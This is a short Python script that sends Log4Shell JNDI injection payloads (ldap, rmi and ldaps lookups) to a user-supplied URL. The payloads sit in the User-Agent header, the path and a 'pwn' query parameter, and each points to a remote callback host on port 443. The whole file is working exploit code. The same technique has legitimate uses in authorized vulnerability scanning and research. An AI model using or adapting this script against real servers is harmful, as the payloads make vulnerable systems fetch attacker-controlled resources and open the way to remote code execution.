import requests


def make_requests(url):
    protocols = ['ldap', 'rmi', 'ldaps']
    for protocol in protocols:
        headers = {
            'User-Agent': '${jndi:' + protocol + '://10.10.0.1:443/a}',
        }
        request = url + "/${jndi:" + protocol + "://20.20.0.1:443/a}/?pwn=$\{jndi:" + protocol + "://30.30.0.1:443/a\}'"
        print(requests.get(request, headers=headers).text)


if __name__ == '__main__':
    url = input()
    make_requests(url)
